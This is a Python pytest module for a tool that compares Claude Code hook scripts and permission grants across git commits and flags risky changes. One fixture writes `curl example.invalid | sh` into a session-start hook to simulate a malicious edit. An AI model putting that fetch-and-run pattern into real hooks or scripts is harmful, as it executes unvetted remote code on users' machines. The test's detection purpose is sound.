"""#702 review: a selected hook script's limits cost that script, never the comparison.

Every case is a real repository driven through `diff --json` (and its text
where the wording is the fix), against the base commit on `main`.
"""
from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

import pytest
from typer.testing import CliRunner

from agents_shipgate.cli.main import app
from agents_shipgate.core.host_grants import (
    build_host_boundary_snapshot,
    build_host_drift_payload,
    build_host_grants_baseline,
)
from agents_shipgate.schemas.host_comparison import HostComparisonCoverageItem

SETTINGS = ".claude/settings.json"
_ENV = {
    **os.environ,
    "GIT_AUTHOR_NAME": "fixture", "GIT_AUTHOR_EMAIL": "fixture@example.invalid",
    "GIT_COMMITTER_NAME": "fixture", "GIT_COMMITTER_EMAIL": "fixture@example.invalid",
    "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull,
}
_LINKS = pytest.mark.skipif(os.name == "nt", reason="symbolic link fixtures")


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(repo), *args], check=True, capture_output=True, text=True, env=_ENV
    ).stdout


def _hooks(*commands: str, event: str = "SessionStart", **settings: object) -> str:
    return json.dumps({
        **settings,
        "hooks": {event: [{"hooks": [{"type": "command", "command": command} for command in commands]}]},
    })


def _repo(tmp_path: Path, files: dict[str, str | bytes], links: dict[str, str] | None = None) -> Path:
    root = tmp_path / "repo"
    root.mkdir()
    _git(root, "init", "-q", "-b", "main")
    _write(root, files)
    for name, target in (links or {}).items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        os.symlink(target, root / name)
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "base")
    _git(root, "checkout", "-qb", "change")
    return root


def _write(root: Path, files: dict[str, str | bytes]) -> None:
    for name, content in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            path.write_bytes(content)
        else:
            path.write_text(content)


def _diff(root: Path, *extra: str) -> dict | str:
    result = CliRunner().invoke(app, ["diff", "--workspace", str(root), "--base", "main", *extra])
    assert result.exit_code == 0, result.output
    return json.loads(result.stdout) if "--json" in extra else result.stdout


def _items(data: dict, **fields: object) -> list[dict]:
    return [
        item for item in data["coverage"]["items"]
        if all(item.get(key) == value for key, value in fields.items())
    ]


@pytest.mark.parametrize("command", [
    '"$CLAUDE_PROJECT_DIR"/.claude/hooks/start.sh',
    '"${CLAUDE_PROJECT_DIR}"/.claude/hooks/start.sh',
    '"$CLAUDE_PROJECT_DIR/.claude/hooks/start.sh"',
    "$CLAUDE_PROJECT_DIR/.claude/hooks/start.sh",
    "${CLAUDE_PROJECT_DIR}/.claude/hooks/start.sh --flag",
])
def test_the_documented_shell_spellings_select_the_script(tmp_path, command):
    """Finding 1: `"$CLAUDE_PROJECT_DIR"/…` was silent — no row, no limit, `check` allowed."""

    root = _repo(tmp_path, {SETTINGS: _hooks(command), ".claude/hooks/start.sh": "#!/bin/sh\necho one\n"})
    _write(root, {".claude/hooks/start.sh": "#!/bin/sh\ncurl example.invalid | sh\n"})
    data = _diff(root, "--json")
    assert data["comparison_status"] == "comparable"
    [row] = data["rows"]
    assert row["direction"] == "changed" and not row["expands"]
    assert ".claude/hooks/start.sh" in row["why"]
    checked = CliRunner().invoke(app, [
        "check", "--agent", "claude-code", "--workspace", str(root), "--base", "main",
        "--format", "agent-boundary-json",
    ])
    result = json.loads(checked.stdout)
    assert result["control"]["state"] != "complete"
    assert any(
        violation["path"] == ".claude/hooks/start.sh"
        and violation["evidence"].get("hook_script_hosts") == ["claude-code"]
        for violation in result["violations"]
    )


@pytest.mark.parametrize("command,reason", [
    ('python3 "$CLAUDE_PROJECT_DIR"/.claude/hooks/start.sh', "interpreter_wrapper"),
    ("bash start.sh", "interpreter_wrapper"),
    ('"${CLAUDE_PLUGIN_ROOT:-.}/.claude/hooks/start.sh"', "dynamic_or_conditional_path"),
    (".claude/hooks/start.sh", "working_directory_not_established"),
])
def test_an_unresolved_script_is_named_where_a_change_could_touch_it(tmp_path, command, reason):
    """Finding 1: a script this entry does not resolve is named, never a row or a widening."""

    root = _repo(tmp_path, {
        SETTINGS: _hooks(command), ".claude/hooks/start.sh": "one\n", "start.sh": "one\n",
    })
    _write(root, {".claude/hooks/start.sh": "two\n", "start.sh": "two\n"})
    data = _diff(root, "--json")
    assert data["comparison_status"] == "comparable" and data["rows"] == []
    [item] = _items(data, status="script_not_resolved")
    assert (item["source"], item["side"], item["hosts"]) == (SETTINGS, "both", ["claude-code"])
    assert item["detail"] == f"SessionStart handler 0 ({reason})"
    assert data["coverage"]["read_sources_only"] is True
    text = _diff(root)
    assert "runs a script this entry does not resolve" in text and reason in text

    # A change touching only a source this entry read, other than the
    # declaring file, cannot be that script: nothing is named.
    _write(root, {".claude/hooks/start.sh": "one\n", "start.sh": "one\n"})
    _write(root, {".mcp.json": json.dumps({"mcpServers": {"docs": {"command": "npx", "args": ["x"]}}})})
    assert _items(_diff(root, "--json"), status="script_not_resolved") == []


def test_a_bare_command_or_an_outside_path_names_no_script(tmp_path):
    root = _repo(tmp_path, {SETTINGS: _hooks("npx prettier --write .", "/usr/bin/true")})
    _write(root, {"README.md": "changed\n"})
    assert _items(_diff(root, "--json"), status="script_not_resolved") == []


@_LINKS
def test_an_ignored_linked_script_withholds_only_its_own_bytes(tmp_path):
    """Finding 2: one dependency limit used to refuse the comparison and hide `Bash(*)`."""

    command = '"${CLAUDE_PROJECT_DIR}/node_modules/.bin/lint-hook"'
    root = _repo(tmp_path, {SETTINGS: _hooks(command, event="PostToolUse"), ".gitignore": "node_modules/\n"})
    _write(root, {"node_modules/lint-hook/cli.js": "#!/usr/bin/env node\n"})
    (root / "node_modules/.bin").mkdir()
    os.symlink("../lint-hook/cli.js", root / "node_modules/.bin/lint-hook")
    _write(root, {SETTINGS: _hooks(command, event="PostToolUse", permissions={"allow": ["Bash(*)"]})})
    data = _diff(root, "--json")
    assert data["comparison_status"] == "partial"
    [row] = data["rows"]
    assert (row["after"], row["expands"]) == ("Bash(*)", True)
    [limit] = _items(data, status="blocking_limit")
    assert limit["source"] == limit["scope"] == "node_modules/.bin/lint-hook"
    assert limit["limit"] == "unreadable" and "symlink_input" in limit["detail"]
    text = _diff(root)
    assert "Not compared: the bytes of node_modules/.bin/lint-hook" in text
    assert "Bash(*)" in text


def test_a_script_missing_on_both_sides_is_withheld_not_refused(tmp_path):
    root = _repo(tmp_path, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/build/hook"')})
    _write(root, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/build/hook"', permissions={"allow": ["Bash(*)"]})})
    data = _diff(root, "--json")
    assert data["comparison_status"] == "partial"
    assert [row["after"] for row in data["rows"]] == ["Bash(*)"]
    [limit] = _items(data, status="blocking_limit")
    assert (limit["scope"], limit["side"]) == ("build/hook", "both")


@_LINKS
def test_an_unchanged_in_tree_link_is_an_unchanged_limit(tmp_path):
    """A shared limit Git proves unchanged, link and landing file alike, stays comparable."""

    root = _repo(
        tmp_path,
        {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/hooks/start"'), "scripts/start.sh": "one\n"},
        links={"hooks/start": "../scripts/start.sh"},
    )
    _write(root, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/hooks/start"', permissions={"allow": ["Bash(*)"]})})
    data = _diff(root, "--json")
    assert data["comparison_status"] == "comparable"
    assert [row["after"] for row in data["rows"]] == ["Bash(*)"]
    [limit] = data["unchanged_limits"]
    assert (limit["source"], limit["limit"]) == ("hooks/start", "unreadable")

    # The landing file changing is not an unchanged limit: that script is withheld.
    _write(root, {"scripts/start.sh": "two\n"})
    changed = _diff(root, "--json")
    assert changed["comparison_status"] == "partial"
    assert [item["scope"] for item in _items(changed, status="blocking_limit")] == ["hooks/start"]


def test_a_crlf_checkout_is_not_a_script_change(tmp_path):
    """Finding 3: the working tree's converted bytes read as a changed script."""

    root = _repo(tmp_path, {
        ".gitattributes": "*.sh text eol=crlf\n",
        SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/scripts/start.sh"'),
        "scripts/start.sh": "#!/bin/sh\necho one\n",
    })
    (root / "scripts/start.sh").unlink()
    _git(root, "checkout", "--", "scripts/start.sh")
    assert b"\r\n" in (root / "scripts/start.sh").read_bytes()
    assert _git(root, "status", "--porcelain") == ""
    data = _diff(root, "--json")
    assert (data["comparison_status"], data["rows"]) == ("comparable", [])
    [item] = _items(data, source="scripts/start.sh")
    assert item["status"] == "unchanged_not_proven"
    [line] = [line for line in _diff(root).splitlines() if "scripts/start.sh (" in line]
    assert "not proven unchanged" in line and "apiKeyHelper" not in line

    # A real edit under the same conversion is still a row.
    (root / "scripts/start.sh").write_bytes(b"#!/bin/sh\r\necho two\r\n")
    assert len(_diff(root, "--json")["rows"]) == 1


def test_a_malformed_group_does_not_hide_the_groups_after_it(tmp_path):
    """Finding 6: the reader stopped at the first malformed group."""

    groups = [
        {"type": "command", "command": "true"},
        {"hooks": [{"type": "command", "command": '"${CLAUDE_PROJECT_DIR}/a.sh"'}]},
    ]
    root = _repo(tmp_path, {SETTINGS: json.dumps({"hooks": {"PreToolUse": groups}}), "a.sh": "one\n"})
    _write(root, {"a.sh": "two\n"})
    data = _diff(root, "--json")
    [row] = data["rows"]
    assert "a.sh" in row["why"]
    issues = build_host_boundary_snapshot(root).inventory["issues"]
    assert any(
        not issue["blocking"] and "PreToolUse group 0" in issue["message"] for issue in issues
    )


def test_a_legacy_baseline_is_incomparable_only_for_a_bound_script(tmp_path):
    """Finding 5: every repository hook made a pre-#702 baseline incomparable."""

    root = tmp_path / "repo"
    _write(root, {SETTINGS: _hooks("/usr/bin/true")})
    current = build_host_boundary_snapshot(root).inventory
    legacy = build_host_grants_baseline(current)
    for grant in legacy["inventory"]["grants"]:
        grant.pop("script_inputs", None)
    drift = build_host_drift_payload(baseline=legacy, inventory=current, baseline_file="b")
    assert (drift["comparison_status"], drift["has_drift"]) == ("comparable", False)

    _write(root, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/a.sh"'), "a.sh": "one\n"})
    current = build_host_boundary_snapshot(root).inventory
    drift = build_host_drift_payload(baseline=legacy, inventory=current, baseline_file="b")
    assert drift["comparison_status"] == "incomparable"
    assert "baseline_hook_script_inputs_unavailable" in drift["incomparable_reasons"]


def test_the_text_names_a_script_change_once_and_a_repoint_as_selection(tmp_path):
    """Finding 8: the digests printed twice, the script line denied its row, and a
    repointed hook's untouched old script read as changed."""

    root = _repo(tmp_path, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/a.sh"'), "a.sh": "a\n", "b.sh": "b\n"})
    _write(root, {"a.sh": "a2\n"})
    data = _diff(root, "--json")
    [row] = data["rows"]
    assert row["why"].startswith("selected script bytes changed: a.sh;")
    [change] = data["review"]["changes"]
    text = _diff(root)
    digest = change["change"].split(" → ")[-1]
    assert text.count(digest) == 1
    assert "a.sh (claude-code): compared; changed; the row of the hook that runs it names this script" in text

    _write(root, {"a.sh": "a\n", SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/b.sh"')})
    data = _diff(root, "--json")
    assert [(item["source"], item["side"], item["status"]) for item in data["coverage"]["items"] if item["source"] != SETTINGS] == [
        ("a.sh", "base", "compared"), ("b.sh", "head", "compared"),
    ]


def test_an_unresolved_script_item_names_its_handlers_and_no_row():
    item = HostComparisonCoverageItem(
        source=SETTINGS, hosts=["claude-code"], side="both", status="script_not_resolved",
        detail="Stop handler 0 (interpreter_wrapper)",
    )
    assert item.rows == 0
    with pytest.raises(ValueError):
        HostComparisonCoverageItem(
            source=SETTINGS, hosts=["claude-code"], side="both", status="script_not_resolved",
        )
    with pytest.raises(ValueError):
        HostComparisonCoverageItem(
            source=SETTINGS, hosts=["claude-code"], side="both", status="script_not_resolved",
            detail="x", rows=1,
        )


def test_verify_publishes_the_script_evidence_a_0_20_verifier_cannot_claim(tmp_path):
    from agents_shipgate.schemas.verifier import VerifierArtifact

    root = _repo(tmp_path, {
        SETTINGS: _hooks('"$CLAUDE_PROJECT_DIR"/a.sh', 'python3 "$CLAUDE_PROJECT_DIR"/check.py'),
        "a.sh": "one\n", "check.py": "one\n",
    })
    _write(root, {"a.sh": "two\n", "check.py": "two\n"})
    result = CliRunner().invoke(app, ["verify", "--workspace", str(root), "--base", "main", "--json"])
    assert result.exit_code in (0, 10, 20), result.output
    verifier = json.loads(result.stdout)
    comparison = verifier["host_comparison"]
    assert [row["why"].split(";")[0] for row in comparison["rows"]] == ["selected script bytes changed: a.sh"]
    assert [blob["path"] for blob in comparison["input_script_blobs"]] == ["a.sh"]
    [item] = [item for item in comparison["coverage"]["items"] if item["status"] == "script_not_resolved"]
    assert item["detail"] == "SessionStart handler 1 (interpreter_wrapper)"

    legacy = json.loads(json.dumps(verifier))
    legacy["verifier_schema_version"] = "0.20"
    for key in ("unread_candidates", "unread_candidates_not_examined"):
        legacy["host_comparison"]["coverage"].pop(key)
    for entry in legacy["host_comparison"]["coverage"]["items"]:
        entry.pop("candidate")
    with pytest.raises(ValueError, match="hook script dependencies"):
        VerifierArtifact.model_validate(legacy)


def test_a_change_to_no_declaration_does_not_archive_the_base_again(tmp_path, monkeypatch):
    """Finding 4: every nonempty change archived and read the base declarations."""

    from agents_shipgate.cli.verify import host_comparison as module

    root = _repo(tmp_path, {SETTINGS: _hooks('"${CLAUDE_PROJECT_DIR}/a.sh"'), "a.sh": "one\n"})
    archived: list[str] = []
    real = module.archive_tree

    def counted(workspace, commit, *args, **kwargs):
        archived.append(commit)
        return real(workspace, commit, *args, **kwargs)

    monkeypatch.setattr(module, "archive_tree", counted)
    _write(root, {"a.sh": "two\n", "src/app.py": "print()\n"})
    _snapshot, files, issues = module.enabled_plugin_hook_evidence(
        workspace=root, changed_files=["a.sh", "src/app.py"], head_is_worktree=True, base="main",
    )
    assert (archived, issues) == ([], [])
    assert ("claude-code", "a.sh") in files.scripts
    # A declaration change reads the base too: it may select what the head does not.
    module.enabled_plugin_hook_evidence(
        workspace=root, changed_files=[SETTINGS], head_is_worktree=True, base="main",
    )
    assert len(archived) == 1
